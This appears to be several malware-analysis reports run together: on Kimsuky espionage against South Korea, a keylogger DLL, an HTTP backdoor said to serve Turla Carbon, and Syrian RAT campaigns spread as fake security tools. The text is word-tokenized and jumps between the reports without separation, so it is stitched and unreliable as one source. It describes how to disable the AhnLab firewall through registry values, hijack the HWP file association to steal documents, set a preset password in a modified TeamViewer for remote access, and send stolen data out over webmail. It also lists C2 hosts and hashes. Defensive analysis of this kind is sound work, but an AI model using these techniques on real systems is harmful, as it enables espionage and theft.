It is not accidental that the malware author has singled out AhnLab 's security product .
During our Winnti research , we learnt that one of the Korean victims was severely criticized by South Korean regulators for using foreign security products .
We do not know for sure how this criticism affected other South Korean organizations , but we do know that many South Korean organizations install AhnLab security products .
Accordingly , these attackers do n't even bother evading foreign vendors ' products , because their targets are solely South Korean .
Once the malware disables the AhnLab firewall , it checks whether the file taskmgr.exe is located in the hardcoded C : WINDOWS folder .
If the file is present , it runs this executable .
Next , the malware loops every 30 minutes to report itself and wait for response from its operator .
Communication between bot and operator flows through the Bulgarian web - based free email server ( mail.bg ) .
The bot maintains hardcoded credentials for its e - mail account .
After authenticating , the malware sends e - mails to another specified e - mail address , and reads e - mails from the inbox .
All these activities are performed via the `` mail.bg '' web - interface with the use of the system Wininet API functions .
From all the samples that we managed to obtain , we extracted the following email accounts used in this campaign : beautifl @ mail.bg ennemyman @ mail.bg fasionman @ mail.bg happylove @ mail.bg lovest000 @ mail.bg monneyman @ mail.bg sportsman @ mail.bg veryhappy @ mail.bg Here are the two `` master '' email addresses to which the bots send e - mails on behalf of the above- mentioned accounts .
They report on status and transmit infected system information via attachments : iop110112 @ hotmail.com rsh1213 @ hotmail.com To report infection status , the malware reads from C : Program FilesCommon FilesSystemOle DBoledvbs.inc which contains the systeminfo command output .
If the file exists , it is deleted after reading .
Then , it reads user - related info from the file sqlxmlx.inc in the same folder ( we can see strings referencing to `` UserID '' commentary in this part of the code ) .
But this file was never created .
As you recall , there is a function that should have collected this data and should have saved it into this sqlxmlx.inc file .
However , on the first launch , the collected user information is saved into `` xmlrwbin.inc '' .
This effectively means that the malware writer mistakenly coded the bot to save user information into the wrong file .
There is a chance for the mistaken code to still work -- user information could be copied into the send information heap .
But not in this case - at the time of writing , the gathered user information variable which should point to the xmlrwbin.inc filename has not yet been initialized , causing the file write to fail .
We see that sqlxmlx.inc is not created to store user information .
Next , the intercepted keystrokes are read from the file and sent to the master .
Keystrokes are logged and kept in an ordinary and consistent format in this file - both the names of windows in which keys were typed and the actual sequence of keyboard entry .
This data is found in the file C : Program FilesCommon FilesSystemOle DBmsolui80.inc created by the external key logger module .
All this data is merged in one file xmlrwbin.inc , which is then encrypted with RC4 .
The RC4 key is generated as an MD5 hash of a randomly generated 117-bytes buffer .
To be able to decipher the data , the attacker should certainly know either the MD5 hash or the whole buffer content .
This data is also sent , but RSA encrypted .
The malware constructs a 1120 bit public key , uses it to encrypt the 117-bytes buffer .
The malware then concatenates all the data to be sent as a 128-bytes block .
The resulting data is saved in C : Program FilesCommon FilesSystemOle DB to a file named according to the following format : '' < system time > _ < account at Bulgarian email server > .txt
'' , for example , `` 08191757_beautifl @ mail.bg.txt '' .
The file is then attached to an e - mail and sent to the master 's e - mail account .
Following transmission , it is immediately deleted from the victim system .
The malware also retrieves instructions from the mail server .
It checks for mails in its Bulgarian e - mail account with a particular subject tag .
We have identified several `` subject tags '' in the network communication : Down_0 , Down_1 , Happy_0 , Happy_2 and ddd_3 .
When found and the e - mail maintains an attachment , the malware downloads this attachment and saves it with filename '' msdaipp.cnt '' in C : Program FilesCommon FilesSystemOle DB .
The attacker can send additional executables in this way .
The executables are RC4 encrypted and then attached .
The key for decryption is hardcoded in the malicious samples .
It 's interesting that the same `` rsh ! @ ! # '' string is maintained across all known samples and is used to generate RC4 keys .
As described earlier , the malware computes the MD5 of this string and uses the hash as its RC4 key to decrypt the executable .
Then , the plain executable is dropped onto disk as `` sqlsoldb.exe '' and run , and then moved to the C : Windows folder with the file name '' taskmgr.exe '' .
The original e - mail and its attachment are then deleted from the Bulgarian e - mail inbox .
The additional key logger module is not very complex -- it simply intercepts keystrokes and writes typed keys into C : Program FilesCommon FilesSystemOle DBmsolui80.inc , and also records the active window name where the user pressed keys .
We saw this same format in the Madi malware .
There is also one key logger variant that logs keystrokes into C : WINDOWSsetup.log .
The next program sent to victims enumerates all the drives on the infected system and executes the following command on them : dir < drive letter > : /a /s /t /-c In practice , this command is written to C : WINDOWSmsdatt.bat and executed with output redirected to C : WINDOWSmsdatl3.inc .
As a result , the latter maintains a listing of all files in all the folders on the drive .
The malware later reads that data and appends it to content of the file C : Program FilesCommon FilesSystemOle DBoledvbs.inc .
At this point , `` oledvbs.inc `` already stores systeminfo output .
It 's interesting that one sample of the directory listing collector was infected with the infamous `` Viking '' virus of Chinese origin .
Some of this virus ' modifications were wandering in the wild for years and its authors or operators would never expect to see it end up in a clandestine APT - related spying tool .
For the attackers , this is certainly a big failure .
Not only does the original spying program have marks of well- known malware that can be detected by anti - malware products ; moreover the attackers are revealing their secret activities to cyber - criminal gangs .
However , by all appearances , the attackers noticed the unwanted addition to their malware and got rid of the infection .
This was the only sample bearing the Viking virus .
Due to expensive work of malware with variety of additional files , it 's not out of place to show these '' relationships '' in a diagram : This module intercepts HWP documents on an infected computer .
The HWP file format is similar to Microsoft Word documents , but supported by Hangul , a South Korean word processing application from the Hancom Office bundle .
Hancom Office is widely used in South Korea .
This malware module works independently of the others and maintains its own Bulgarian e - mail account .
The account is hardcoded in the module along with the master 's e - mail to which it sends intercepted documents .
It is interesting that the module does not search for all the HWP files on infected computer , but reacts only to those that are opened by the user and steals them .
This behavior is very unusual for a document - stealing component and we do not see it in other malicious toolkits .
The program copies itself as < Hangul full path > HncReporter.exe and changes the default program association in the registry to open HWP documents .
To do so , it alters following registry values : HKEY_CLASSES_ROOTHwp . Document.7shellopencommand or HKEY_CLASSES_ROOTHwp . Document.8shellopencommand By default , there is the registry setting `` < Hangul full path > Hwp.exe '' `` % 1 '' associating Hangul application '' Hwp.exe '' with .HWP
documents .
But the malicious program replaces this string with the following : `` < Hangul full path > HncReporter.exe `` `` % 1 '' .
So , when the user is opening any .HWP
document , the malware program itself is executed to open the .HWP
document .
Following this registry edit , any opened .HWP
document is read and sent as an e - mail attachment with the subject `` Hwp '' to the attackers .
After sending , the malware executes the real Hangul word processing application `` Hwp.exe '' to open the .HWP
document as the user intended .
The means the victim most likely will not notice the theft of the .HWP
file .
The module 's sending routine depends on the following files in C : Program FilesCommon FilesSystemOle DB folder : xmlrwbin.inc , msdaipp.cnt , msdapml.cnt , msdaerr.cnt , msdmeng.cnt and oledjvs.inc .
An extra program is dedicated exclusively to download attachments out of incoming e - mails with a particular subject tag .
This program is similar to the pivot module but with reduced functionality : it maintains the hardcoded Bulgarian e - mail account , logs in , reads incoming e - mails and searches for the special subject tag `` Team '' .
When found , it loads the related attachment , drops it onto the hard drive as C : Program FilesCommon FilesSystemOle DBtaskmgr.exe and executes .
This particular executable arrives without any encryption .
It is also interesting that the malware author did not custom develop a backdoor program .
Instead , the author modified TeamViewer client version 5.0.9104 .
The initial executable pushed by attackers in e - mails related to the remote control module consists of three more executables .
Two of them are Team Viewer components themselves , and another is some sort of backdoor loader .
So , the dropper creates three files in the C : WindowsSystem32 directory : netsvcs.exe - the modified Team Viewer client ; netsvcs_ko.dll - resources library of Team Viewer client ; vcmon.exe - installer / starter ; and creates the service `` Remote Access Service '' , adjusted to execute C : WindowsSystem32vcmon.exe at system startup .
Every time the vcmon.exe is executed , it disables AhnLab 's firewall by zeroing out following registry values : HKLMSOFTWAREAhnLabV3 365 ClinicInternetSec UseFw = 0 UseIps = 0 Then , it modifies the Team Viewer registry settings .
As we said , the Team Viewer components used in this campaign are not the original ones .
They are slightly modified .
In total , we found two different variants of changed versions .
The malware author replaced all the entries of `` Teamviewer '' strings in Team Viewer components .
In the first case with the `` Goldstager '' string and with the string `` Coinstager '' in the second .
TeamViewer client registry settings are then HKLMSoftwareGoldstagerVersion5 and HKLMSoftwareCoinstagerVersion5 correspondingly .
The launcher sets up several registry values that control how the remote access tool will work .
Among them is SecurityPasswordAES .
This parameter represents a hash of the password with which a remote user has to connect to Team Viewer client .
This way , the attackers set a pre - shared authentication value .
After that , the starter executes the very Team Viewer client netsvcs.exe .
It 's interesting that the drop box mail accounts iop110112 @ hotmail.com and rsh1213 @ hotmail.com are registered with the following `` kim '' names : kimsukyang and `` Kim asdfa '' .
Of course , we ca n't be certain that these are the real names of the attackers .
However , the selection is n't frequently seen .
Perhaps it also points to the suspected North Korean origin of attack .
Taking into account the profiles of the targeted organizations -- South Korean universities that conduct researches on international affairs , produce defense policies for government , national shipping company , supporting groups for Korean unification -- one might easily suspect that the attackers might be from North Korea .
The targets almost perfectly fall into their sphere of interest .
On the other hand , it is not that hard to enter arbitrary registration information and misdirect investigators to an obvious North Korean origin .
It does not cost anything to concoct fake registration data and enter kimsukyang during a Hotmail registration .
We concede that this registration data does not provide concrete , indisputable information about the attackers .
However , the attackers ' IP - addresses do provide some additional clues .
During our analysis , we observed ten IP - addresses used by the Kimsuky operators .
All of them lie in ranges of the Jilin Province Network and Liaoning Province Network , in China .
No other IP - addresses have been uncovered that would point to the attackers ' activity and belong to other IP - ranges .
Interestingly , the ISPs providing internet access in these provinces are also believed to maintain lines into North Korea .
Finally , this geo - location supports the likely theory that the attackers behind Kimsuky are based in North Korea .
Files used by malware : % windir % system32kbdlv2.dll % windir % system32auto.dll % windir % system32netsvcs.exe % windir % system32netsvcs_ko.dll % windir % system32vcmon.exe % windir % system32svcsmon.exe % windir % system32svcsmon_ko.dll % windir % system32wsmss.exe % temp % ~DFE8B437DD7C417A6D.TMP % temp % ~DFE8B43.TMP % temp % ~tmp.dll C : Windowstaskmgr.exe C : Windowssetup.log C : Windowswinlog.txt C : Windowsupdate.log C : Windowswmdns.log C : Windowsoledvbs.inc C : Windowsweoig.log C : Windowsdata.dat C : Windowssys.log C : WindowsPcMon.exe C : WindowsGoogle Update.exe C : WindowsReadMe.log C : Windowsmsdatt.bat C : Windowsmsdatl3.inc C : Program FilesCommon FilesSystemOle DBmsdmeng.cnt C : Program FilesCommon FilesSystemOle DBxmlrwbin.inc C : Program FilesCommon FilesSystemOle DBmsdapml.cnt C : Program FilesCommon FilesSystemOle DBsqlsoldb.exe C : Program FilesCommon FilesSystemOle DBoledjvs.inc C : Program FilesCommon FilesSystemOle DBoledvbs.inc C : Program FilesCommon FilesSystemOle DBmsolui80.inc C : Program FilesCommon FilesSystemOle DBmsdaipp.cnt C : Program FilesCommon FilesSystemOle DBmsdaerr.cnt C : Program FilesCommon FilesSystemOle DBsqlxmlx.inc < Hangul full path > HncReporter.exe Related MD5 : 3baaf1a873304d2d607dbedf47d3e2b4 3195202066f026de3abfe2f966c9b304 4839370628678f0afe3e6875af010839 173c1528dc6364c44e887a6c9bd3e07c 191d2da5da0e37a3bb3cbca830a405ff 5eef25dc875cfcb441b993f7de8c9805 b20c5db37bda0db8eb1af8fc6e51e703 face9e96058d8fe9750d26dd1dd35876 9f7faf77b1a2918ddf6b1ef344ae199d d0af6b8bdc4766d1393722d2e67a657b 45448a53ec3db51818f57396be41f34f 80cba157c1cd8ea205007ce7b64e0c2a f68fa3d8886ef77e623e5d94e7db7e6c 4a1ac739cd2ca21ad656eaade01a3182 4ea3958f941de606a1ffc527eec6963f 637e0c6d18b4238ca3f85bcaec191291 b3caca978b75badffd965a88e08246b0 dbedadc1663abff34ea4bdc3a4e03f70 3ae894917b1d8e4833688571a0573de4 8a85bd84c4d779bf62ff257d1d5ab88b d94f7a8e6b5d7fc239690a7e65ec1778 f1389f2151dc35f05901aba4e5e473c7 96280f3f9fd8bdbe60a23fa621b85ab6 f25c6f40340fcde742018012ea9451e0 122c523a383034a5baef2362cad53d57 2173bbaea113e0c01722ff8bc2950b28 2a0b18fa0887bb014a344dc336ccdc8c ffad0446f46d985660ce1337c9d5eaa2 81b484d3c5c347dc94e611bae3a636a3 ab73b1395938c48d62b7eeb5c9f3409d 69930320259ea525844d910a58285e15 Names of services created by malware : DriverManage WebService WebClientManager Remote Access Service We detect these threats as Trojan . Win32.Kimsuky except modified Team Viewer client components which are detected as Trojan . Win32.Patched.ps .
File name : varies MD5 : a3cbf6179d437909eb532b7319b3dafe Compilation timestamp : 2012.10.02 10:51:50 ( GMT ) Compiler : Microsoft Visual Studio 2010 File format : PE32 DLL Exports : _ LowLevelKeyboardProc @ 12 Creates the log file : % TEMP % \~DFD3O8.tmp .
If failed , tries to write to the file f : \keyhook.log Each time the keylogger starts , it appends the following header to the log file : -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- New Session : % fully qualified computer name % % timestamp % -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- It then creates a hidden console window and registers its only export _ LowLevelKeyboardProc @ 12 as a hook procedure for low - level keyboard input events ( WH_KEYBOARD_LL hook ) .
Depending on the results , it writes a line to its log file .
In case the hook was installed , the line is '' Started ...
'' , else `` LoadLibrary ' % path to its file % ' failed , % error code % '' .
It also starts a thread that retrieves the current foreground window handle every 100 milliseconds .
This handle is then used in the keyboard hook procedure .
The low - level keyboard hook procedure intercepts WM_KEYDOWN , WM_KEYUP and WM _ SYSKEYDOWN system messages and writes information about each keystroke to the log file .
Every time a new window becomes active , it retrieves its name and the path to its application and writes this information to the log file : [ % path to the application 's executable file % : `` % window title % '' ] Analyzed file ( others are similar ) : Compilation timestamp : 2013.10.15 10:43:09 ( GMT ) File format : PE32 DLL , modified ( the file is supposed to be started by a custom loader ) Exports : The main functionality is implemented in a single function that is called by the DllMain entry point .
The exported functions allow to call the same function directly ( exported as `` start '' ) or to start / stop it in a separate thread ( `` ModuleStart '' / '' ModuleStop '' ) and with slightly different parameters .
This indicates the backdoor can also function as a plugin for the Turla Carbon system .
The main function executes in an infinite loop .
It collects most of the available information about the system , transmits it to the C & C server and executes the commands it receives back .
The module delays execution for random periods while it discovers running processes with one of the following filenames : The following system information is collected : The retrieved information is compressed using bzip2 , encrypted with AES and then encoded using Base64 before being transmitted to the C & C server .
When there is a file waiting for upload ( usually , this is file that contains the results of the previously received and executed command ) , it is read from disk and uploaded to the server instead of the system information .
The C & C communication is implemented on top of the standard HTTP / HTTPS protocols .
The list of the C & C URLs is hardcoded in the binary but may be overridden by further commands .
The module uses Wininet API functions for issuing HTTP POST requests to the server .
The module transmits the collected information in the body of the POST request and gets new commands from the server 's response .
The request body can be empty if there is no new information to upload .
The response is usually an HTML document and the commands are Base64-encoded strings enclosed in < div > / < /div > tags .
Every command is encrypted using asymmetric encryption with temporary AES session keys .
Each command is a mixed text / binary buffer .
It consists of two parts : payload and configuration .
The configuration is an INI file that controls the further behavior of the module .
It is extracted into a temporary file named % TEMP % \~D % random % .tmp
.
The payload , if exists , is supposed to be an executable file and may be executed if there is a corresponding command present in the INI part .
The Global Research and Analysis Team ( GReAT ) at Kaspersky Lab has discovered new malware attacks in Syria , with malicious entities using a plethora of methods from their toolbox to hide and operate malware .
In addition to proficient social engineering tricks , victims are often tempted to open and explore malicious files because of the dire need for privacy and security tools in the region .
In the hopes of maintaining anonymity and installing the latest `` protection '' , victims fall prey to these malicious creations .
A vast majority of the samples obtained were found on activist sites and in social networking forums .
The victims are distributed across different countries : • Syria • Lebanon • Turkey • Kingdom of Saudi Arabia • Egypt • Jordan • Palestine • United Arab Emirates • Israel • Morocco • United States The group members are operating from different locations around the world : • Syria • Russian Federation • Lebanon The group 's attacks are evolving and they are making extensive use of social engineering techniques to trick targeted victims into running their malicious files .
Among the principal file extensions observed among the malware samples obtained we can list : • .exe
• .dll
• .pif
• .scr
The group is relying on RAT ( Remote Access Tool ) Trojan tools , of which the most common are : • ShadowTech RAT • Xtreme RAT • NjRAT • Bitcomet RAT • Dark Comet RAT • Blackshades RAT The number of malicious files found is 110 , with a big increase seen in recent attacks .
The number of domains linked to the attacks is 20 .
The number of IP addresses linked to the attacks is 47 .
The samples details and domains lists used by the attackers can be found in the Appendices 1 and 2 in the end of the document .
Protection and resilience against these attacks is ensured through the use of a multi - layered security approach , having up to date security products , and mainly by being sceptical about suspicious files .
The geopolitical conflicts in the Middle East have deepened in the last few years ; Syria is no exception .
The crisis is taking many forms , and the cyberspace conflict is intensifying as sides try to tilt the struggle , by exploiting cyber intelligence and exercising distortion .
In the last few years cyber - attacks in Syria have moved into the front line ; many activities in cyberspace have been linked to Syria , especially those conducted by the Syrian Electronic Army and pro - government groups .
The Global Research and Analysis Team ( GReAT ) at Kaspersky Lab has found new malware attacks in Syria , using new but not advanced techniques to hide and operate malware , in addition to using proficient social engineering tricks to deliver malware by tricking and tempting victims into opening and exploring malicious files .
The malware files have been found on hacked activist sites , web pages and in social networking forums .
Cyber Arabs , an Arabic - language digital security project of the IWPR ( Institute for War and Peace Reporting ) , reported four of these samples in March 2014 .
The same samples were also reported on Syrian Facebook pages ( ‫تقنيون ألجل الحرية‬ , Technicians For Freedom ) : https : //www.facebook.com/ tech4freedom Given the complexity of the situation , there are many factors and entities at play in this event , but from the outside these are all largely speculative .
Pro - government groups talk about `` defense '' and opposition activists talk about `` offense '' .
Here , we will only focus on the malware and the facts that have been found during the analysis , presenting only relevant information , in the hope of setting a clear context for this research .
Malware writers are using multiple techniques to deliver their files and entice the victims to run them , creating an effective infection vector .
Mainly depending on social engineering the attackers exploit : • Victims ' trust in social networking forums • Victims ' curiosity in following news related to political conflict in Syria • Victims ' fear of attacks from government • Victims ' lack of technology awareness Once they have infected the victim 's computer , attackers have full access and control over victim 's devices .
In the following section we show different versions of posts sent via popular file sharing sites or social networking platforms .
The sample details and domain lists used by the attackers can be found in the Appendices 1 and 2 in the end of the document .
Messages sent via Skype offer links to download : 1 .
The `` SSH VPN '' program to encrypt communication 2 .
The popular and effective antivirus with daily updates from `` Ammazon Internet Security '' 3 .
The `` SmartFirewall '' to block connections made by malware and bad programs The messages are usually sent from fake or compromised accounts .
The same messages sent via Skype are also shared via the Facebook social platform , asking victims to install these `` security programs '' to protect themselves from malware infections and cyber - attacks , especially government attacks .
In the following example , we can see a YouTube video providing links to download fake Whatsapp and Viber applications for PC .
By using everyday technologies that are commonly used by a broad audience , attackers increase the effectiveness of their operations and their infection rates .
Analysis has led us to identify the following RAT variants being used in the wild : • ShadowTech RAT • Xtreme RAT • NjRAT • Bitcomet RAT • Dark Comet RAT • BlackShades RAT The samples collected during our research can be classified as follows .
Old samples Samples obtained during 2013 are simple RAT executable files , compressed and sent to victims using a wide range of delivery options .
Newer samples were typically found to use `` .scr
'' containers in order to hide malicious files and avoid early detection by security solutions .
New samples More recent samples , starting from the end of 2013 , have shown a more organized development effort , creating highly stealth and graphically - enticing applications .
In this analysis we have seen how Syrian malware has evolved , showing no signs of stopping any time soon .
Even though new malicious Syrian samples are appearing each day , the subset presented here will hopefully give the reader an overall view of the techniques and tools that are currently being used to target Syrian citizens .
Curiosity killed the cat : browsing a previously leaked spreadsheet of wanted activists leads to infection .
We found a set of compressed files on a popular social networking site ; when , extracted it showed a database containing a list of activists and wanted individuals in Syria .
A video entitled '' ‫ `` إختراق أجهزة الكمبيوتر الخاصة بالمجرم علي مملوك وباقي عصابة االسد‬was published on November 9 2013 , and the download link for this database application was included in the information section of the video .
The download URL redirected victims to a file - sharing service where the file was being hosted .
The compressed RAR file `` ‫برنامج االٔمن الوطني‬.rar '' , with the MD5 signature 0c711bf29815aecc65016712981 59a74 and a file - size of 7,921,063 bytes was protected with the password `` 111222333 '' .
The video requests the victim to scan the password protected `` .rar
'' file using VirusTotal to verify that it is not infected .
After extracting all the files to a temporary folder , we were presented with the application itself and a text file needed to access the `` hidden '' features of the program .
The file `` PASSWORD.txt file '' contained the following text : syria123 ! @ # ‫ال تبخلوا علينا بالدعاء قراصنة جبهة النصرة‬ Upon closer inspection , the first and last buttons of the application were functional , but the others generated error messages ( claiming that some files were missing ) .
The first button ( ‫فيش عام شامل‬ , General Global File ) uses `` data-base.db.exe '' ( MD5 8f16efb51fe67961e e31c4f36cbe11db ) , which was placed into `` C : \Users\User\AppData\Roaming '' and , when executed , extracts the Excel spreadsheet file `` Data - Base.xslx '' ( MD5 f0a8a1556efbb106b6297700d4cce61b ) from the `` Data - Base.db '' ( MD5 95a5c3e91bbb4a3a323433841fbef82a ) file in the main folder .
The last button ( ‫ ) إنهاء الب رنامج‬is the exit button .
Here is some interesting information worth noting : • `` ‫ب رنامج االٔمن الوطني‬.exe '' is not detected as a malicious file .
• The file `` data - Base.db '' is detected as a malicious file .
The file `` data-base.db '' is a compressed archive : • Product name from the file signature : Project1 • Publisher name from the signature : Syrian malware • Compilation Timestamp : 2013 - 11 - 09 14:47:26 When system32.exe is run , the process `` iexplorer.exe '' is spawned and is automatically registered for Startup .
The file connects to the IP address 31.9.48.7 TCP on port 999 .
As mentioned in previous reports , the IP address 31.9.48.7 belongs to the Syrian Telecommunications Establishment ( STE ) .
Other temporary files used for the infection were also detected , such as `` system32.exe '' ( MD5 : 9424b355a3670fd7749d3d25cbea18cb ) which was copied into the `` C : \Users\user\appdata\ local\temp\ '' folder .
The presence of DarkComet 's `` DC_MUTEX- * '' was a giveaway of the usage of this remote administration tool .
During infection , the Excel spreadsheet is displayed , comprising 96763 rows and 13 columns of activist information .
The rows correspond to records of individuals wanted by the government and the columns correspond to information about the individuals .
While there is no column description , data in each column reflects the type of data .
A disturbing video showing injured victims of recent bombings was used to appeal to people 's fear and exert them to download a malicious application available in a public file - sharing website .
After our initial analysis , the file named `` ‫فضائح‬.exe '' proved to be heavily obfuscated with the commercial utility `` MaxToCode '' for .NET
as a means of avoiding early detection by antivirus solutions .
When executed , the original sample created another executable file in the Windows ' temporary folder ( C : \Users\ [ USERNAME ] \AppData\Local\Temp ) named `` Trojan.exe '' , which corresponds to the code of the RAT itself .
This is used to save all keystrokes and system activity to another file in the same location , `` Trojan.exe.tmp '' .
Captured information is sent to a dynamic domain corresponding to the host `` hacars11.no-ip.biz '' , using local port 1177 with no SSL encryption ( but base64 encoded ) , making the analysis of the network traffic a much easier task .
During the initial connection to the remote server ( after an initial ping to check for internet connectivity ) , the Trojan will send the machine 's name , installed Windows version , logged username , webcam availability and the version of the RAT in use .
Several embedded command line scripts are in charge of adding the Trojan 's executable file to the Windows Firewall allowed list , while at the same time disabling security zone checking in Internet Explorer .
System persistence is obtained via a modification in the `` Software\Microsoft\Windows\ CurrentVersion\Run '' registry key and by adding a copy of the malware to the Startup folder .
Even though different obfuscation techniques are used in the samples we analysed , all of them have underlying dependencies on the .NET
framework namespaces , which eventually allows deep source code inspection of the threat .
If you thought the era of fake antivirus programs was over , here comes a newly developed sample to challenge your beliefs .
With the innocent title of `` Ammazon Internet Security '' , this malicious application tries to mimic a security scanner , even including a quite thorough graphical user interface and some interactive functionality .
Again , this shows the simplicity of creating a graphical user interface that will trick most of the non- tech - savvy population .
Using nothing more than a couple of buttons and a catchy name , Syrian malware groups were hoping that the intended victims would fall for the trap .
Analyzing the code interestingly revealed that it has the look -- feel of a security application ; but , of course , no real security features .
While silently executing a remote administration tool when launching this `` security suite '' , targeted victims were left without their `` Ammazon '' protection but witha RAT installed .
From the Windows process list shown in Process Explorer , we were able to see `` J. L Antivirus 4.0 '' executing in our system , and through Process Monitor we caught the creation of the `` analysis '' log file for our fake antivirus .
Behind the curtains , a connection is made to a remote host , sending real time information on all our activities - the real cost of this free internet security suite ! Among the many programming methods found inside the source code , we were even able to find a `` CheckForUpdates '' function ; and if you look closely enough you can even see `` Detection '' and '' Quarantine '' assemblies included in this application .
So , not only has a lot of work gone into creating this fake antivirus , the authors also followed good programming practices and implemented modules for each specific ( albeit fake ) functionality .
Maybe at a really quick first sight this could pose as a legitimate tool , but a deeper inspection reveals its true malicious nature .
The real log file was one where all keystrokes were recorded and later sent from the computer via a TCP connection .
Even though this type of keylogging functionality is nothing new , when we consider how these malicious applications are being used , and the control they give to the attackers , we can start to measure the importance of reporting these threats and providing protection from them .
Evidently , the malware authors did n't care much to provide an option to close the `` antivirus '' , and if you were to kill the process you would get a nice ' blue screen of death ' and an unexpected system reboot .
Surely , the fake application will load again once everything is back up , creating an interesting method for guaranteeing persistence .
Total Network Monitor ( which is a legitimate application ) was inside another sample we found , used with embedded malware for spying purposes .
Offering security applications to protect against surveillance is one of the many techniques used by malware writing groups to get victims who are in desperate need for privacy to execute these dubious programs .
An almost fully functional version of the `` Total Network Monitor '' utility is included .
What this modified version does not show is the remote connection made to a host where f system information is dumped .
The actual infection is performed when first clicking on the installer , which uses obfuscation to hide all malicious activity until the `` legitimate '' tool is completely installed .
As with other samples reviewed , system persistence is obtained by modifying Windows start - up registry keys .
Using names such as `` Desktop Manager '' increases the likelihood for this threat to go unnoticed .
However , the entry name `` empty '' or `` empty.exe '' should raise a red flag when auditing these keys .
As with other samples , social engineering does all of the heavy work .
Instant messaging applications for desktop operating systems have been used in the past to spread malware and it seems that Syrian malware authors have jumped on the bandwagon .
In contrast to the `` Ammazon Internet Security '' , these samples do n't contain any graphical user interface or even an error message that will tell the victim not to worry about their security .
Heading straight for system infection has proven successful for them , and using these popular application names gets the interest of a much larger audience .
The following screenshot shows how the application name , intended functionality and even the icon used , all work in conjunction to create a believable story for the victim .
And this is not a comprehensive list , by any means .
Framing and social engineering techniques are playing an essential role in all Syrian related malware threats and the trend suggests that the complexity of them will only keep on increasing .
Another attack uses social engineering tricks .
The sample 38e3bc8776915dbd2e55a4d90f85a872 , named `` Kimawi.exe '' and with JPG icon , is a RAT file bound to the picture `` Kimawi.jpg '' .
This picture is a previously leaked paper supposedly by the regime in Syria warning military units to prepare for chemical attacks from friendly units .
Different remote administration tools have been spotted in the wild ; most of them provide an extensive range of functionality to fully control infected systems .
These include : • Keylogging • Capturing screenshots and webcam control .
• Recording live sound / video .
• Installing programs • Uploading / downloading files • File , process and registry key management • Remote shell • Executing DDoS attacks TLP : Green For any inquire please contact intelreports @ kaspersky.com 22 Among the most popular RAT found in the samples subset is Dark Comet , a free remote administration tool that provides a comprehensive command set for the attackers to use in their malicious purposes .
Another RAT widely used in the Arab world is NjRAT , which includes a list of commands ( see below ) that can be sent from the controller to the infected system .
The attackers are working on full power , and the number of attacks and malicious files being distributed is constantly increasing as they become more organized and proficient .
Below is the timeline distribution for malicious files distributed during 2013 - 2014 , based on the first time they were distributed or seen in public ( Skype , Facebook , file - sharing , email , etc . ) .
Below is the timeline distribution for the collected samples based on compilation time The samples details and domains list used by the attackers can be found in the Appendices 1 and 2 in the end of the document .
The group responsible for the attacks is using common techniques shared by many of the hacking groups around the world .
They benefit from dynamic domains that can be linked to their modem devices and configured with forward functionality to a public IP address assigned by the ISP .
By restarting their modems they obtain a new address , creating a dynamic infrastructure that can be easily managed .
Dynamic Update Clients ( DUC ) on their computer devices ( usually the same as the RAT server ) are in charge of having the dynamic domain provider update to the newly assigned address .
Since the end of 2013 , the group has extensively relied on a class C IP subnet , 31.9.48.0/24 , provided by TARASSUL ISP ( Syrian Telecommunications Establishment ) for its attacks .
We suspect this subnet has been allocated to the group , also an indication that they are now operational from a single location .
In early 2014 , the group moved to an IP address in Russia ( 31.8.47.7 ) , to launch multiple new attacks .
This domain is registered for the email aloshalaa @ gmail.com .
It served as a pro - regime website back in 2012 and is being used for the C & C of some of the RAT files .
The domain was registered to okpa1984 @ gmail.com from 2011 to 2013 .
Malware has also been seen connecting to xtr.all4syrian.com and vip.all4syrian.com .
The map below shows the attackers ' geograhical distribution based on the geolocation of the IP addresses used by the C & C servers : The distribution of victims is confined only to Syria , but also reaches nearby countries .
We have observed victims of the Syrian - based malware in : • Syria • Lebanon • Turkey • Kingdom of Saudi Arabia • Egypt • Jordan • Palestine • United Arab Emirates • Israel • Morocco • United States Below are snapshots taken from videos published by the attackers , showing their RAT control panel and list of victims .
This shows some of the victims located in different countries .
The sample details and domain lists used by the attackers can be found in Appendices 1 and 2 in the end of this document .
It is worth noting that we have seen evidence of activists trying to carry out Denial of Service attacks on the RAT domains and servers , in an effort to overwhelm their resources and cause their connections to timeout .
The post below shows a warning from activists about pro - government hacker attacks on Facebook pages , explaining how pro - government groups post links to Trojanized applications in order to infect users The activists announce in the post that they have spotted a C & C domain used by the Trojans and that they are attacking it to remove all hacked victims .
From many posts , forums and identification videos , it is clear that the group has an organized structure of teams working together , The names and positions outlined below were collected from posts on infiltrated forums or pages .
They are all either nicknames or incomplete names that do not enable full identification of the attackers .
The Resistant Syrian Electronic Army • Group 1 : Team Hacker and Assad Penetrations Unit • Group 2 : Anonymous Syria Al Assad Unit • Group 3 : Management of Electronic Monitoring and Central Tracking Unit Remote Administration Tool ( RAT ) Trojans are malicious programs that allow a remote `` operator '' to control a system as if he has physical access to that system .
Malicious RATs are widely used by different types of cybercriminals ( hacktivists , script - kiddies , and scammers ) and even in some state - sponsored attacks .
Some of the most popular RATs are detected by Kaspersky products as following : • Trojan . MSIL.Zapchast , also known as Njrat • Backdoor . Win32.Bifrose , also known as Bitfrose • Backdoor . Win32.Fynloski , also known as DarkComet • Backdoor . Win32.Xtreme , also known as Xtremrat The statistics below , extracted from the Kaspersky Security Network ( KSN ) , show the number of RAT infection attacks blocked by Kaspersky Lab products in the MENA ( Middle East North Africa ) region in the 2013 - 2014 period : Based on KSN world statistics , the MENA region has one of the highest numbers for RAT attacks , as shown below : • Algeria has the highest number of users facing NjRat infection for the 2013 - 2014 period and five countries from MENA are in the NjRat top 10 • Algeria has the highest number of users facing Xtreme RAT infection for the 2013 - 2014 period and four countries from MENA are in the Xtreme RAT top 10 .
• Four countries from MENA are in the Bifrose top 10 infection list .
• Three countries from MENA are in the DarkComent top 10 .
Syrian malware has a strong reliance on social engineering and the active development of technologically complex malicious variants .
Nevertheless , most of them quickly reveal their true nature when inspected carefully ; and this is one of the main reasons for urging Syrian users to be extra vigilant about what they download and to implement a layered defense approach .
Antivirus software uses either signature or heuristic - based detection to identify malware .
On the one hand , signature detection searches for a unique sequence of bytes that is specific to a piece of malicious code .
On the other hand , heuristic detection identifies malware based on program behaviour .
